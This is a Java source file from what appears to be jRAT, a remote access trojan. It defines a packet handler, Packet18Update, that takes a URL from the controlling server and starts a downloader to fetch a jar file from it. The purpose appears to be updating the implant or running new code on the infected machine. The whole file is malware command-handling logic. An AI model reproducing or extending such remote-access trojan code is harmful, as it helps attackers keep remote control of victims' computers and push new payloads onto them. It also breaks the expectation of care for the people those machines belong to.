package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.Downloader;

public class Packet18Update implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = con.readLine();
		boolean fromLocal = con.readBoolean();
		new Downloader(con, url, true, "jar", fromLocal).start();
	}

}
